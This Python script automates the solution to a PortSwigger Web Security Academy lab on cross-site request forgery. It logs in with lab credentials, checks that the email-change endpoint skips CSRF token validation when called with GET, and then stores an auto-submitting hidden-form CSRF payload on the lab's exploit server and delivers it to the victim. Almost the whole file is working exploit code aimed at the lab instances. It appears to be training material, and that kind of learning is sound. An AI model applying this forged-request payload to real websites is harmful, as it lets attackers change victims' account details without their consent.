# https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method

import typer
import requests
from lxml import html
from rich.console import Console
import inquirer
from http import HTTPStatus

console = Console()
SERVER="https://0aa3002303f99124c1d7f47f005e00b0.web-security-academy.net"
EXPLOIT_SERVER="https://exploit-0a1a007c03cd9144c100f33d01c900d1.exploit-server.net"



def login(session, server):
    response = session.get(f"{server}/login")
    console.log(f"\nGET login status code {response.status_code}\n")
    html_document = html.fromstring(response.content)
    csrf_token = html_document.xpath("//input[@name = 'csrf']/@value")[0]
    response = session.post(f"{server}/login", data={
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter",
    })
    console.log(f"POST login status code {response.status_code}\n")

def update_email(session, server, exploit_server):
    response = session.get(f"{server}/my-account")
    console.log(f"GET my-account status code {response.status_code}\n")
    html_document = html.fromstring(response.content)
    email = "ciccio@pasticcio.it"
    csrf_token = html_document.xpath("//input[@name = 'csrf']/@value")[0]

    csrf_token=input('Insert new CSRF for the POST request (if you want to leave the field blank PRESS ENTER): ')

    response = session.post(f"{server}/my-account/change-email", data={
        "email": email,
        "csrf": csrf_token,
    })

    console.log(f"\nPOST change-email status code {response.status_code}\n")

    confirm = {
    inquirer.Confirm('confirmed',
                     message="Change method from POST to GET?" ,
                     default=False),
    }
    confirmation = inquirer.prompt(confirm)
    if confirmation['confirmed']==True:
        get_update_email(session, server, exploit_server)

def get_update_email(session, server, exploit_server):
    email="ciccio@pasticcio.it"
    csrf=None
    confirm = {
    inquirer.Confirm('confirmed',
                     message="email= ciccio@pasticcio.it, csrf= None , are default parameters, \n Would you like to change them?" ,
                     default=True),
    }
    confirmation = inquirer.prompt(confirm)
    
   
    if confirmation['confirmed']==True:
        questions = [inquirer.List('params',
                message="Which param do you want to change?",
                choices=['email', 'csrf', 'both'],
            ),]   
        answers = inquirer.prompt(questions)

        if answers['params']=='email':
            email=input('insert new email: ')
        elif answers['params']=='csrf':
            csrf=input('insert new csrf: ')
        else:
            email=input('insert new email: ')
            csrf=input('insert new csrf: ')
        print("email= ", email," csrf= ", csrf)

    response = session.get(f"{server}/my-account/change-email?email={email}&csrf={csrf}")
    
    if response.status_code == HTTPStatus.OK:
        console.log(f"GET change-email status code {response.status_code}\n")
        confirm = {
            inquirer.Confirm('confirmed',
                     message="The server doesn't consider the csrf parameter, would you like to exploit it?" ,
                     default=True),
        }
        confirmation = inquirer.prompt(confirm)
        if confirmation['confirmed']==True:
            csrf_exploit(session, server, exploit_server, email, csrf)
    else:
        console.log(f"GET change-email status code {response.status_code}\n")


def csrf_exploit(session, server, exploit_server, email, csrf):
    response = session.post(f"{exploit_server}/", data={
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8v",
        "responseBody": f'''
        <html>
        <!-- CSRF PoC - generated by Burp Suite Professional -->
        <body>
        <script>history.pushState('', '', '/')</script>
            <form action="{server}/my-account/change-email">
            <input type="hidden" name="email" value={email} />
            <input type="hidden" name="csrf" value={csrf} />
            <input type="submit" value="Submit request" />
            </form>
            <script>
            document.forms[0].submit();
            </script>
        </body>
        </html>

        ''',
        "formAction": "STORE",
    })
    console.log(f"POST STORE status code {response.status_code}")

    response = session.post(f"{exploit_server}/", data={
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8v",
        "responseBody": f'''
        <html>
        <!-- CSRF PoC - generated by Burp Suite Professional -->
        <body>
        <script>history.pushState('', '', '/')</script>
            <form action="{server}/my-account/change-email">
            <input type="hidden" name="email" value={email} />
            <input type="hidden" name="csrf" value={csrf} />
            <input type="submit" value="Submit request" />
            </form>
            <script>
            document.forms[0].submit();
            </script>
        </body>
        </html>

        ''',
        "formAction": "DELIVER_TO_VICTIM",
    })
    console.log(f"POST DELIVER_TO_VICTIM status code {response.status_code}\n")
    if response.status_code == HTTPStatus.OK:
        style = "bold white on green"
        console.print("Lab Solved", style=style, justify="center")




def main(server=SERVER, exploit_server=EXPLOIT_SERVER):
    session = requests.Session()
    login(session, server)
    update_email(session, server, exploit_server)
    

if __name__ == "__main__":
    typer.run(main)